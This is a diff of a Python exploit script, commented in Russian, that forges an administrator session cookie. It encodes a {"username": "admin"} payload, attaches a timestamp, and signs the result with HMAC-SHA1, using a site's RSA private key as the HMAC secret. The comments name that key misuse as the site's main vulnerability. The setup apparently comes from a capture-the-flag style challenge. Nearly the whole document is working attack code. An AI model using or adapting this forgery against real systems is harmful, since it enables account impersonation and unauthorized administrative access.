@@ -1,38 +1,37 @@
 import hmac
 import hashlib
 import base64
-import time
-import struct
 
-# ВСТАВЬ СЮДА СВОЙ ПРИВАТНЫЙ КЛЮЧ (ВЕСЬ ТЕКСТ ЦЕЛИКОМ)
-# Сохрани переносы строк и дефисы!
-SECRET_KEY = """-----BEGIN PRIVATE KEY-----
-MIIBu... (скопируй всё содержимое оттуда) ...
-...
+# 1. Вставь сюда свой ПРИВАТНЫЙ КЛЮЧ (целиком, как на сайте)
+PRIVATE_KEY = """-----BEGIN PRIVATE KEY-----
+MIIBu... (ТУТ ТВОЙ ДЛИННЫЙ КЛЮЧ) ...
 -----END PRIVATE KEY-----"""
 
-def forge_token():
-    # 1. Создаем пэйлоад для Админа
-    header = '{"username": "admin"}'
-    # Кодируем в URL-safe Base64
-    part1 = base64.urlsafe_b64encode(header.encode()).decode().rstrip('=')
+# 2. Вставь сюда любую рабочую временную метку (из твоей куки - средняя часть)
+# Токен выглядит так: part1.part2.part3
+# part2 - это timestamp (например, "aZCbaw")
+TIMESTAMP_PART = "aZCbaw" 
 
-    # 2. Создаем метку времени (как на сайте)
-    # Используем текущее время
-    ts = int(time.time())
-    # Упаковываем в 4 байта (Big Endian), как делает сервер (aZCbaw -> timestamp)
-    part2 = base64.urlsafe_b64encode(struct.pack('>I', ts)).decode().rstrip('=')
+def forge():
+    # Готовим заголовок для Админа
+    # {"username": "admin"} в Base64Url
+    header = b'{"username": "admin"}'
+    part1 = base64.urlsafe_b64encode(header).decode().rstrip('=')
+    
+    # Собираем данные: payload.timestamp
+    data_to_sign = f"{part1}.{TIMESTAMP_PART}"
 
-    # 3. Собираем данные для подписи
-    msg = f"{part1}.{part2}"
-
-    # 4. Подписываем (HMAC-SHA1), используя Приватный Ключ как ПАРОЛЬ
-    # (Сайт ошибочно использует RSA ключ как строку-секрет для HMAC)
-    signature = hmac.new(SECRET_KEY.encode(), msg.encode(), hashlib.sha1).digest()
+    # Подписываем (HMAC-SHA1), используя приватный ключ как пароль
+    # Это главная уязвимость: ключ RSA используется как строка-секрет
+    signature = hmac.new(
+        PRIVATE_KEY.strip().encode(), 
+        data_to_sign.encode(), 
+        hashlib.sha1
+    ).digest()
+    
     part3 = base64.urlsafe_b64encode(signature).decode().rstrip('=')
 
-    # 5. Результат
-    print(f"\n[+] FORGED COOKIE: {msg}.{part3}")
+    print(f"\n[+] ТВОЯ АДМИНСКАЯ КУКА:\n{data_to_sign}.{part3}")
 
 if __name__ == "__main__":
-    forge_token()
+    forge()
